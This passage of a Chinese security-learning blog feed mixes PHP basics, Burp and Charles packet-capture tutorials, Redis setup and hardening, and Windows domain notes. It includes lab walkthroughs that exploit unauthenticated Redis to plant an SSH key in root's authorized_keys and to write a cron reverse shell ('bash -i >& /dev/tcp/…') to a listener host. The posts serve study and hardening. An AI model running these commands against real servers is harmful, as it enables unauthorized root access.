operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//haha    单行注释</span><span class="token comment" spellcheck="true">/*多行注释*/</span></code></pre><h2 id="php粘合"><a href="#php粘合" class="headerlink" title="php粘合"></a>php粘合</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"haha"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"nihao"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里的.叫做粘合</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="互动网站"><a href="#互动网站" class="headerlink" title="互动网站"></a>互动网站</h2><blockquote><p>GET——可以获取提交信息，多用于取东西。</p><p>POST——多用于提交用户名和密码时。</p></blockquote><p>写一个get请求</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"----"</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>参数a和参数b之间用&amp;粘合</p><p>上面那个玩意可以再加一点东西</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">'chengnian '</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>    <span class="token keyword">echo</span> <span class="token string">'wei cheng nian '</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><blockquote><p>POST：多用在用户名密 码注册，登录</p><p>GET：多用在取东西</p></blockquote><p>把上面那个get改成post</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"----"</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>post无法直接在浏览器输入框里更改，可以使用抓包的方式或者使用hackbar</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/03/22/php-sql/">php和数据库</a></li><li><a href="https://blogs.kainy.cn/2010/01/网页中常用符号的HTML实体/">网页中常用符号的HTML实体</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 编程 </tag>
            
            <tag> 网页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全行业以及周边介绍</title>
      <link href="/2022/03/20/security-introduce/"/>
      <url>/2022/03/20/security-introduce/</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全行业以及周边介绍"><a href="#网络安全行业以及周边介绍" class="headerlink" title="网络安全行业以及周边介绍"></a>网络安全行业以及周边介绍</h1><blockquote><p>1.不要用学的技术乱来</p><p>2.不要在一切国内平台发表不当言论</p><p>3.不要用使用的技术入侵国内任何机构</p><p><a href="https://njeclissi.lanzoux.com/b01bfj0pc">普通工具 (lanzoux.com)</a></p><p>密码：6k6a</p></blockquote><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>先安装jre环境，安装完之后验证：cmd-&gt;java有东西就完成了</p><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>原理</p><p><img src="/2022/03/20/security-introduce/burp-yuanli.png" alt="image-20211213220359361"></p><p>火狐+burp</p><p>burpsuite里面-&gt;proxy-&gt;options</p><p>走的时候127.0.0.1:8080</p><p>在火狐浏览器里面把代理设置为127.0.0.1:8080</p><h4 id="火狐-burp无法浏览https"><a href="#火狐-burp无法浏览https" class="headerlink" title="火狐+burp无法浏览https"></a>火狐+burp无法浏览https</h4><p>在浏览器里面输入<a href="http://burp/%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6">http://burp/下载证书</a></p><p>然后在火狐里点击工具-&gt;选项-&gt;高级-&gt;证书-&gt;查看证书-&gt;导入证书</p><h4 id="出现乱码"><a href="#出现乱码" class="headerlink" title="出现乱码"></a>出现乱码</h4><p>User options-&gt; Display 更改编码类型</p><h4 id="抓取百度数据包"><a href="#抓取百度数据包" class="headerlink" title="抓取百度数据包"></a>抓取百度数据包</h4><pre class=" language-base"><code class="language-base">GET /s?ie=utf-8&mod=1&isbd=1&isid=A719837A80D11720&ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=123&fenlei=256&rsv_pq=b804497600000e15&rsv_t=7a36fmMmo8SbLjTA0N%2FEneh0BvCpDToRb20%2B8qKbsxsR8EN%2B4RziZW%2Fj7Vs&rqlang=cn&rsv_enter=0&rsv_dl=ib&rsv_btype=i&rsv_sid=36068_35105_36023_34813_34584_36140_36120_36054_35993_35984_35319_26350_36101_36061&_ss=1&clist=&hsug=&f4s=1&csor=3&_cr1=28503 HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3is_referer: https://www.baidu.com/is_xhr: 1X-Requested-With: XMLHttpRequestReferer: https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=123&fenlei=256&rsv_pq=b804497600000e15&rsv_t=7a36fmMmo8SbLjTA0N%2FEneh0BvCpDToRb20%2B8qKbsxsR8EN%2B4RziZW%2Fj7Vs&rqlang=cn&rsv_enter=0&rsv_dl=ib&rsv_btype=iCookie: BAIDUID=A71983DE83BFE41D197C2FDB06A7A80D:FG=1; BIDUPSID=82DEF01D6F2DDF09225229E10038AD8C; PSTM=1642411432; baikeVisitId=d9095499-f022-481b-9dc4-91690fbab182; COOKIE_SESSION=681_4_3_4_8_4_1_0_3_3_0_0_681_142_3_0_1642762023_1635311093_1642762020%7C9%230_4_1635310849%7C1; __sec_t_key=6ea911e1-06f5-47a7-aac6-f8e2d8dea7d8; BD_HOME=1; H_PS_PSSID=36068_35105_36023_34813_34584_36140_36120_36054_35993_35984_35319_26350_36101_36061; BD_UPN=13314352; BA_HECTOR=ag2g0g80a0848g2hej1h3dpvb0q; WWW_ST=1647765487151DNT: 1Connection: close</code></pre><p><code>GET</code> 百度地址的提交方式是GET</p><p><code>Host</code>地址名</p><p><code>User-Agent</code>主机信息，包括浏览器类别，浏览主机型号</p><p><code>Accept-Language</code>语言</p><p><code>Referer</code>访问来路，就是表示用户在哪里进行的访问。通过referer可以识别你是来自哪个平台来进行访问的（比如每个直播app的referer值都是不一样的，从而可供商家统计从哪个直播平台引流的人多）</p><p><code>cookie</code>相当于用户登录的信息，用于和浏览器进行对应，从而达到登录状态。被黑客拿到即可被登录用户。</p><h4 id="网络传输"><a href="#网络传输" class="headerlink" title="网络传输"></a>网络传输</h4><p>一般网络传输的是源代码，信息请求一般以十六进制传输，在网络（网线）里是按01传输的</p><p>即：01010101110 -&gt;转化成-&gt;hex(十六进制) 》再转化成-&gt;人类可读</p><p>（前端代码是通过浏览器渲染之后变成我们看到的样子）</p><h3 id="burp基本用法"><a href="#burp基本用法" class="headerlink" title="burp基本用法"></a>burp基本用法</h3><p><img src="/2022/03/20/security-introduce/burp-site.png" alt="image-20220320170638426"></p><p><img src="/2022/03/20/security-introduce/burp-intercept.png" alt="image-20220320171020744"></p><p><strong>http history</strong></p><p>抓包过程中可以看这些数据包分别是按什么顺序提交的，并可以查看相应参数</p><p>params判断提交的请求是否有带参数</p><p>edited判断是否被修改过</p><p>status是http的一个响应：200是正常的，404是没有找到页面</p><p>length是该网页大小</p><p>MIME type显示类型：html、text（查询时出现的一些联想文本等）、script（特效比如颜色等用js编写的）等</p><p>extension后缀名：js、html、php等</p><p><strong>options</strong></p><p>查看需要通过什么地址才可以让浏览器去使用brupsuite</p><p><strong>Spider</strong></p><p>爬虫——收集用户信息</p><p>可以爬取该网站上的所有信息</p><p><strong>Intruder</strong></p><p>暴力破解</p><p><strong>Repeater</strong></p><p>模拟提交</p><p><strong>Decoder</strong></p><p>转换编码等，快速加密、解密等</p><p><strong>comparer</strong></p><p>对比两个文本的区别</p><p><strong>User options</strong></p><p>用户选择的一些默认字体、编码等。</p><h3 id="charles使用"><a href="#charles使用" class="headerlink" title="charles使用"></a>charles使用</h3><blockquote><p>分析手机app或者电脑app比较好使</p></blockquote><p>抓包软件——更适合手机抓包，也可用于电脑抓包，但相比于brupsuite它不能把数据包停下来。适合分析手机、电脑app。</p><p><img src="/2022/03/20/security-introduce/image-20220101163140958.png" alt="image-20220101163140958"></p><p>使用8888端口</p><p><img src="/2022/03/20/security-introduce/image-20220101164618445.png" alt="image-20220101164618445"></p><p>对本地局域网代理服务器改一下。</p><p><img src="/2022/03/20/security-introduce/image-20220101163234680.png" alt="image-20220101163234680"></p><p>安装后即可进行抓包。但并不能抓到https的数据包。</p><p><img src="/2022/03/20/security-introduce/image-20220101163513380.png" alt="image-20220101163513380"></p><p>设置为所有的ssl代理都要去抓包</p><p>如果需要在远程浏览器或者手机浏览器上安装，需要输入以下地址：</p><p><img src="/2022/03/20/security-introduce/image-20220101164258603.png" alt="image-20220101164258603"></p><p>然后浏览上述网页去进行安装。</p><p><img src="/2022/03/20/security-introduce/image-20220101165045084.png" alt="image-20220101165045084"></p><p><img src="/2022/03/20/security-introduce/image-20220101165237798.png" alt="image-20220101165237798"></p><p>然后就可以抓包https的数据包。</p><p>与brupsuite的区别：以树状图呈现抓包数据，功能如下：</p><p><img src="/2022/03/20/security-introduce/image-20220101165614843.png" alt="image-20220101165614843"></p><p><img src="/2022/03/20/security-introduce/image-20220101165642661.png" alt="image-20220101165642661"></p><p>标黄的网址表示正在传输数据的</p><p><strong>最适合用于在手机上抓包</strong>：</p><p>需要把socks代理打开</p><p><img src="/2022/03/20/security-introduce/image-20220101165924608.png" alt="image-20220101165924608"></p><p>socks代理：拦截socks请求。</p><h3 id="web常见术语"><a href="#web常见术语" class="headerlink" title="web常见术语"></a>web常见术语</h3><p><strong>刷新</strong>：刷新当前页面</p><p><strong>跳转</strong>：跳到陌生的一个地方</p><p>“当用户刷新后，其后台会跳转到一个新的页面”</p><p><strong>GET</strong>：通过地址栏从服务器拿东西。在GET里刷新和跳转没区别。</p><p><strong>POST</strong>：提交表单，送给服务器东西。按下回车键，服务器会以GET方式读取一下当前地址，刷新会再次（重复）提交数据到当前页面</p><p><strong>刷新</strong>：从浏览器取网页的新内容来更新本地缓存，更新的同时保留一些本地变量。</p><p><strong>跳转</strong>：在地址栏输入新的地址，不会更新本地的缓存和变量。</p><p><strong>www</strong>：world wide web万维网（由<strong>web客户端</strong>和<strong>服务器</strong>组成）</p><p><strong>web客户端</strong>：浏览器 web browser</p><p><strong>浏览器</strong>：可以访问网页服务器的web系统，查看html文件（例如IE edge、chrome、Firefox、Opera、Safari）</p><p><strong>request</strong>：向服务器发送一个请求，服务器会返回一个结果给客户端。</p><p><strong>forward</strong>：服务器内部发生重定向。（服务器内部自己发生变化，比如小黄网跳转、发送验证码等）</p><p><strong>redirect</strong>：服务器收到请求后发送一个状态给客户，客户会再次请求，此时url发生了改变。（公司更改网址等）</p><p><strong>url</strong>：统一资源定位器（比如：<a href="http://www.baidu.com/index.php">http://www.baidu.com/index.php</a> 协议+域名+文件）(<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv</a> bp&#x3D;1&amp;rsv idx&#x3D;1&amp;tn&#x3D;baidu&amp;wd&#x3D;12306 s&#x3D;文件 ?&#x3D;get请求 ie&#x3D;参数名 utf-8&#x3D;参数值 &amp;&#x3D;连接符 )</p><p><strong>http</strong>：超文本传输协议</p><p><strong>https</strong>：安全的超文本传输协议</p><p>所有的www文件都支持这个标准。http是基于tcp&#x2F;ip【本身是有漏洞的】传输的。</p><p><strong>web服务器（中间件）</strong>：比如phpstudy的中间件是apache、iis、nginx、tomcat……配合前端和后端的一个协商者</p><p>“目标为某个web服务器”：web服务器接收到一个请求，会向客户发送响应消息</p><p><strong>需要掌握</strong>：</p><p>1 http是<strong>无连接</strong>的！！！限制每一次的连接请求，每一次一个请求，服务器收到请求之后完成应答，断开连接，节省传输时间。</p><p>2 http是<strong>媒体独立</strong>的：只要客户端，服务器都知道这个 数据是干嘛用的，就可以使用http传输。（比如下载东西可以直接用抓包下载）</p><p>3 http是<strong>无状态</strong>的：无状态就是没有记忆能力，如果中途中断了，就需要重传。</p><p><strong>http状态码</strong>：在brupsuite可以在status栏里看到——</p><p>200 成功访问</p><p>301 网页被永久转向了其他的url</p><p>404 请求的资源不存在</p><p>500 服务器内部错误</p><p><strong>http数据包解析</strong>：</p><p><strong>请求头Request</strong>：</p><p><code>GET</code>：请求类型</p><p><code>Host</code>：目标</p><p><code>user-agent</code>：用户信息，浏览器是什么等</p><p><code>accept-language</code>：国家</p><p><code>referer</code>：表示从什么地方来的信息</p><p><strong>响应头Response类型</strong>：</p><p><code>HTTP/1.1 200 OK</code>：协议类型</p><p><code>Content-Type</code>：文档类型</p><p><code>Content-Length</code>：传过来的内容长度（多少个字节）</p><p><code>Expires</code>：什么时候文档过期，不再缓存它</p><p><code>Last-Modified</code>：最后修改时间</p><p><code>refresh</code>：浏览器多长时间后刷新该文档。</p><p><code>server</code>：服务器名字</p><p><code>set-cookie</code>：是否需要cookie支持</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis安全策略</title>
      <link href="/2022/03/19/redis-security/"/>
      <url>/2022/03/19/redis-security/</url>
      
        <content type="html"><![CDATA[<h1 id="redis基本安全策略"><a href="#redis基本安全策略" class="headerlink" title="redis基本安全策略"></a>redis基本安全策略</h1><p>最好不要用root用户启动redis</p><p>单独为redis设置一个账号</p><p>设置本地localhost不允许外部访问</p><p>redis保护模式protected-mode开启（默认开启）</p><p>端口修改为其他端口（默认为6379）</p><p>requirepass设置复杂的密码</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> kali </tag>
            
            <tag> 数据库 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis-keys</title>
      <link href="/2022/03/19/redis-keys/"/>
      <url>/2022/03/19/redis-keys/</url>
      
        <content type="html"><![CDATA[<h1 id="redis和秘钥登录"><a href="#redis和秘钥登录" class="headerlink" title="redis和秘钥登录"></a>redis和秘钥登录</h1><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><blockquote><p>redis的未授权访问是很危险的，需要打开密码功能</p></blockquote><pre class=" language-Linux"><code class="language-Linux">cd /etc/redis   //进入redisnano redis.conf   //打开配置文件</code></pre><p>在配置文件中加入</p><pre class=" language-redis"><code class="language-redis">requirepass haha123      //自己写个密码，比如haha123</code></pre><p>然后重启服务</p><pre class=" language-Linux"><code class="language-Linux">redis-server /etc/redis/redis-cli -h 192.168.3.135进入后auth haha123    //输入密码</code></pre><blockquote><p>添加ssh</p></blockquote><pre class=" language-Linux"><code class="language-Linux">ssh-keygen -t rsa</code></pre><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre class=" language-Linux"><code class="language-Linux">redis-cli -h 192.168.3.135 -a haha123  //登录</code></pre><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><blockquote><p>在kali命令行中输入</p></blockquote><pre class=" language-Linux"><code class="language-Linux">ssh-keygen -t rsacd .ssh(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > key.txtcat key.txt | redis-cli -h 192.168.3.135 -a haha123 -x set xxx</code></pre><blockquote><p>进入redis数据库</p></blockquote><pre class=" language-redis"><code class="language-redis">config set dir /root/.sshconfig set dbfilename authorized_keyssave</code></pre><blockquote><p>然后就可以通过在kali端ssh免密码登录</p></blockquote><pre class=" language-Linux"><code class="language-Linux">sh -i id_rsa root@192.168.3.135</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> kali </tag>
            
            <tag> 数据库 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis写文件</title>
      <link href="/2022/03/19/redis-file/"/>
      <url>/2022/03/19/redis-file/</url>
      
        <content type="html"><![CDATA[<h1 id="redis数据库写入文件"><a href="#redis数据库写入文件" class="headerlink" title="redis数据库写入文件"></a>redis数据库写入文件</h1><blockquote><p>计划任务反弹shell（ubuntu不能，centos）</p></blockquote><blockquote><p>写入一句话木马</p></blockquote><p>&#x3D;&#x3D;在kali里面测试&#x3D;&#x3D;</p><pre class=" language-redis"><code class="language-redis">打开redis数据库keys *set haha "\n\n * * * * bash -i >& /dev/tcp/192.168.3.134/9999 0>&1\n\n"get haha</code></pre><blockquote><p>另起一个窗口，先测试命令是否有问题</p></blockquote><p>&#x3D;&#x3D;kali&#x3D;&#x3D;</p><pre class=" language-Linux"><code class="language-Linux">nc -nlvp 9999</code></pre><p>&#x3D;&#x3D;ubuntu&#x3D;&#x3D;</p><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/9999 0>&1</code></pre><blockquote><p>可以连接上，命令无问题</p></blockquote><p>&#x3D;&#x3D;kali&#x3D;&#x3D;</p><pre class=" language-redis"><code class="language-redis">打开redis数据库config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>&#x3D;&#x3D;ubuntu&#x3D;&#x3D;</p><pre class=" language-Linux"><code class="language-Linux">cd/var/spool/cron/cat root可以查看到root里是写入的重定向</code></pre><blockquote><p>计划任务地点</p></blockquote><pre class=" language-Linux"><code class="language-Linux">/etc/crontab/etc/cron.d//var/spool/cron/crontabs/</code></pre><blockquote><p>ubuntu中计划任务出现乱码会不执行，但是centos会忽略乱码，所以可以执行</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Linux </tag>
            
            <tag> kali </tag>
            
            <tag> 数据库 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> redis </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis部署</title>
      <link href="/2022/03/18/redis-deploy/"/>
      <url>/2022/03/18/redis-deploy/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis部署"><a href="#Redis部署" class="headerlink" title="Redis部署"></a>Redis部署</h1><blockquote><p>redis数据库属于nosql系列的数据库，缓存类，支持数据持久化，擅长把内存数据直接读取</p><p>关系型数据库</p></blockquote><h2 id="Ubuntu上安装"><a href="#Ubuntu上安装" class="headerlink" title="Ubuntu上安装"></a>Ubuntu上安装</h2><p>&#x3D;&#x3D;redis服务器安装&#x3D;&#x3D;</p><pre class=" language-Linux"><code class="language-Linux">wget http://download.redis.io/releases/redis-4.0.9.tar.gz   //下载tar -zxvf redis-4.0.9.tar.gz   //解压apt install make  //安装makeapt install gcc //安装gccmake test //测试make install //安装cd /usr/local/bin   //进入bin目录ls -all      //看到redis-server就算成功了mkdir /etc/redis    //新建一个文件夹cp /usr/local/redis/redis.conf /etc/rediscd /etc/redis</code></pre><blockquote><p>在配置文件中修改参数</p></blockquote><pre class=" language-Linux"><code class="language-Linux">bind 本机daemonize yes</code></pre><blockquote><p>保存退出之后进行测试</p></blockquote><pre class=" language-Linux"><code class="language-Linux">redis-server /etc/redis/redis.confps aux | grep redisredis-cli -h 192.168.3.135</code></pre><blockquote><p>大佬们的玩笑，输入ping回pong</p></blockquote><h2 id="Kali上安装"><a href="#Kali上安装" class="headerlink" title="Kali上安装"></a>Kali上安装</h2><p>&#x3D;&#x3D;redis服务安装&#x3D;&#x3D;</p><pre class=" language-Linux"><code class="language-Linux">wget http://download.redis.io/redis-stable.tar.gztar -zxvf redis-stable.tar.gzcd redis-stablemakecp src/redis-cli /usr/bin   //直接使用命令redis-cli -h 192.168.3.135</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/119e14ff.html">大数据单机学习环境-MySQL</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> kali </tag>
            
            <tag> 数据库 </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网和域</title>
      <link href="/2022/03/18/filed/"/>
      <url>/2022/03/18/filed/</url>
      
        <content type="html"><![CDATA[<h1 id="内网和域"><a href="#内网和域" class="headerlink" title="内网和域"></a>内网和域</h1><h2 id="windows域环境"><a href="#windows域环境" class="headerlink" title="windows域环境"></a>windows域环境</h2><blockquote><p>企业中的内网中，经常使用windows server</p><p>工作组work group  最简单的资源管理-工作站（组内的主机）</p><p>域Domain  一般来说是计算机内网的一种形式</p><p>域控，对多台主机进行控制  有权利给每个用户发布账户，控制账户</p><p>域之间可以通信   域控是权限最高的 Domain Controller &#x3D; DC</p></blockquote><p>单域              </p><p>父域和子域</p><p>多域（树）</p><p>域林</p><h2 id="计算机分类"><a href="#计算机分类" class="headerlink" title="计算机分类"></a>计算机分类</h2><blockquote><p>DC，成员，客户机，独立服务器</p><p>DC是必须的，因为安装了活动目录（AD）</p><p>DC域控制器：用户登录，访问等操作都可以通过DC去完成，多个DC一起工作</p><p>成员服务器：安装了服务器的操作系统，并且加入了域，但没加入AD（web，数据库，邮件，防火墙，远程访问，打印机等等）</p><p>客户机：普通用户</p><p>独立服务器：自己就是一个工作组，啥也没安装</p></blockquote><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><h3 id="组group"><a href="#组group" class="headerlink" title="组group"></a>组group</h3><blockquote><p>用户账户集合</p><p>域本地组：（多域用户访问单域资源）指多域用户可以访问域内资源，授权给组员访问资源       来自域林，可以作用于本域</p><p>全局组：（单域用户访问多域资源）来自本域，作用于域林</p><p>通用组：（多域用户访问多域资源）</p></blockquote><h2 id="活动目录Active-Directory-（AD）"><a href="#活动目录Active-Directory-（AD）" class="headerlink" title="活动目录Active Directory （AD）"></a>活动目录Active Directory （AD）</h2><blockquote><p>域的基本就是AD</p><p>可以提供服务器和客户机之间管理，管理账户，实现组策略等等内容，提供企业通讯录，用户信息，用户管理，身份验证，用户授权管理，实施策略等等</p><p>客户计算机管理，用户服务，资源管理，桌面配置，应用系统支撑</p></blockquote><h2 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h2><blockquote><p>Internet–DMZ–内网</p><p>一般放防火墙，FTP等等</p></blockquote><h2 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h2><h3 id="Win2012"><a href="#Win2012" class="headerlink" title="Win2012"></a>Win2012</h3><blockquote><p>首先配置2012，先把ip地址改为静态ip</p></blockquote><p><img src="/2022/03/18/filed/2012-ip.png" alt="image-20220318164343622"></p><blockquote><p>可以把计算机名改成一个顺眼的，比如DC，然后重启</p></blockquote><p><img src="/2022/03/18/filed/2012-name.png" alt="image-20220318165556709"></p><blockquote><p>点开服务器管理器，点击添加角色和功能，然后一路下一步</p></blockquote><p><img src="/2022/03/18/filed/2012-user.png" alt="image-20220318164527435"></p><blockquote><p>勾选Active Directory 域服务和DNS服务器，然后下一步</p></blockquote><p><img src="/2022/03/18/filed/2012-ad.png" alt="image-20220318164752698"></p><blockquote><p>这个地方打上勾，然后安装</p></blockquote><p><img src="/2022/03/18/filed/2012-restart.png" alt="image-20220318164858310"></p><blockquote><p>安装成功之后在小旗子这里将服务器提升为域控制器</p></blockquote><p><img src="/2022/03/18/filed/2012-yukong.png" alt="image-20220318165417809"></p><p><img src="/2022/03/18/filed/2012-lin.png" alt="image-20220318165741205"></p><p><img src="/2022/03/18/filed/2012-pass.png" 